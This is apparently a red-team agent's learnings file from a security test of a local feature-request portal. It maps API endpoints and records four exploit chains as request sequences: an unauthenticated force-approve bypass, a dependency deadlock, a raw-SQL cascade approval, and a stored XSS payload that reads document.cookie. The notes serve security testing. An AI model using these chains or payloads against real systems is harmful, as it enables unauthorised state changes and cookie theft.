# Red Teamer — Learnings

<!-- Updated after each Guardian run. Record successful exploit chains, endpoints that responded to probing, objective patterns that worked, dead ends to skip. -->

## Run: 2026-07-20

### Key Discovery: Test Environment Mismatch
- The pen-tester statically analyzes `Source/Backend/` (the workflow engine prototype)
- `docker-compose.test.yml` runs the **portal** application from the `portal/` directory (not `Source/Backend/`)
- The portal is a different but architecturally similar codebase — same vulnerability patterns, different route paths
- Always verify actual running endpoints first: `docker exec dev-crew-portal-1 cat /app/Backend/src/index.ts`

### Endpoint Map (Portal App — http://localhost:3001)
- `/health` → 200 OK (health check)
- `/metrics` → 200 OK (Prometheus, no auth)
- `/api/feature-requests` → GET list, POST create
- `/api/feature-requests/:id` → GET, PATCH, DELETE
- `/api/feature-requests/:id/approve` → POST (majority vote required)
- `/api/feature-requests/:id/force-approve` → POST **CRITICAL: no auth, skips majority vote**
- `/api/feature-requests/:id/vote` → POST (triggers AI voting simulation, requires `potential` status)
- `/api/feature-requests/:id/retrigger` → POST (re-runs AI voting, requires `voting` status)
- `/api/feature-requests/:id/deny` → POST (requires comment field)
- `/api/feature-requests/:id/dependencies` → POST (add/remove cross-entity deps)
- `/api/feature-requests/:id/ready` → GET (readiness/blocker check)
- `/api/feature-requests/:id/images` → POST (image upload)
- `/api/bugs` → GET list, POST create
- `/api/bugs/:id` → GET, PATCH, DELETE
- `/api/cycles` → GET list, POST create
- `/api/search?q=` → GET (in-memory title/ID search, returns bugs+FRs, limit=20)
- `/api/pipeline-runs` → GET (empty in test env)
- `/api/team-dispatches` → GET
- `/api/learnings` → GET

### Confirmed Exploit Chains

#### Chain 1: Force-Approve State Machine Bypass (Critical)
```
POST /api/feature-requests  (no auth → creates item in `potential`)
PATCH /api/feature-requests/:id {"status":"voting"}  (no auth → voting, 0 votes)
POST /api/feature-requests/:id/force-approve  (no auth → approved, skips vote check)
PATCH {"status":"in_development"}  → PATCH {"status":"completed"}
```
Result: Full pipeline traversal without any authentication or AI vote.

#### Chain 2: Dependency Deadlock via Delete (High)
```
POST /api/feature-requests  (create FR-A, blocker)
POST /api/feature-requests  (create FR-B, blocked)
POST /api/feature-requests/FR-B/dependencies {"action":"add","blocker_id":"FR-A"}
[advance FR-B to pending_dependencies]
DELETE /api/feature-requests/FR-A
GET /api/feature-requests/FR-B/ready  → {ready:false, unresolved_blockers:[{status:"unknown"}]}
```
Result: FR-B permanently non-dispatchable. No remediation path.

#### Chain 3: Cascade Auto-Dispatch (High)
```
Create FR-A (blocker) and FR-B (blocked, pending_dependencies)
PATCH FR-A → voting → force-approve → in_development → completed
[onItemCompleted fires] → raw SQL UPDATE FR-B SET status='approved'
```
Result: FR-B approved with 0 votes via direct DB update, bypassing all service guards.

#### Chain 4: Stored XSS (High)
```
POST /api/feature-requests {"title":"<img src=x onerror=alert(document.cookie)>"}
GET /api/feature-requests → XSS payload in response
GET /api/search?q=img → XSS payload in search results
```
Result: Payload stored and returned verbatim; any frontend unsafe-rendering will execute.

### Dead Ends (Do Not Re-test)
- **SQL injection**: better-sqlite3 parameterized queries prevent all injection. Status filter returns 0 results, not all items.
- **Mass assignment**: `status`, `id`, `votes` in create body are ignored by service layer.
- **State skip via PATCH**: STATUS_TRANSITIONS enforced — `potential→completed` returns 400.
- **Deny after approve**: State machine blocks this (409).
- **Concurrent /vote race**: First /vote moves to `voting`; subsequent calls fail (requires `potential`).
- **IDOR on deleted items**: Hard delete — 404 returned, item truly gone.

### Notes on Pagination
- `/api/feature-requests?limit=2` returns ALL items (limit parameter ignored entirely)
- No `total`/`page` fields in response — no server-side pagination implementation
- This is a data enumeration risk but not a DoS vector (in-memory store, no slice misuse)

### Metrics & Information Disclosure
- `GET /metrics` → full Prometheus data, no auth
- `X-Powered-By: Express` on all responses — remove with `app.disable('x-powered-by')`
- Error messages reveal internal state (valid transition targets listed in 400 errors)
